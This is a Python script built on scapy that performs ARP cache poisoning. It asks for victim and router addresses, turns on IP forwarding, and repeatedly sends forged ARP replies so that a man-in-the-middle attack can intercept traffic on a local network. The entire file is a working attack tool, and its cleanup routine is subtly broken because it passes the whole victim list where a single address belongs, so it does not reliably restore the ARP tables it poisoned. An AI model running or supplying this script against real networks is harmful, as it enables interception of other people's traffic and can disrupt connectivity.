from scapy.all import *
import sys, os, time

try:
	interface = input("[*] Enter desired interface :")
	victim_ip = list(input("[*] Enter Victim IP :").split(" "))
	gate_ip = input("[*] Enter Router IP :")
except KeyboardInterrupt:
	print("\n[*] User requested shutdown")
	print("[*] Exiting....")
	sys.exit(1)

print("[*] Enabling IP forwarding....\n")
os.system("sudo sysctl -w net.inet.ip.forwarding=1")


def getMac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2,
		iface=interface, inter=0.1)
	for snd, rcv in ans:
		return rcv.sprintf(r"%Ether.src%")


def reARP():
	print("[*] Restoring Targets")
	gate_mac = getMac(gate_ip)
	for v in victim_ip:
		victim_mac = getMac(victim_ip)
		send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, 
			hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
		send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, 
			hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
	print("[*] Disabling IP forwarding")
	os.system("sudo sysctl -w net.inet.ip.forwarding=0")
	print("[*] Shutting Down....")
	sys.exit(1)

def trick(gm, vm, vip, gip):
	send(ARP(op=2, pdst=vip, psrc=gip, hwdst= vm))
	send(ARP(op=2, pdst=gip, psrc=vip, hwdst= gm))


def mitm():
	try:
		victim_macs = []
		for v in victim_ip:
			victim_macs.append(getMac(v))

	except Exception as e:
		print(str(e))
		os.system("sudo sysctl -w net.inet.ip.forwarding=0")
		print("[!] Couldn't find Victim MAC")
		print("[!] Exiting....")
		sys.exit(1)
	try:
		gate_mac = getMac(gate_ip)
	except Exception as e:
		print(str(e))
		os.system("sudo sysctl -w net.inet.ip.forwarding=0")
		print("[!] Couldn't find Router MAC")
		print("[!] Exiting....")
		sys.exit(1)
	print("[*] Poisoning targets.....")
	while 1:
		try:
			for i in range(len(victim_macs)):
				trick(gate_mac, victim_macs[i], victim_ip[i], gate_ip)
			time.sleep(1)
		except KeyboardInterrupt:
			reARP()
			break

mitm()



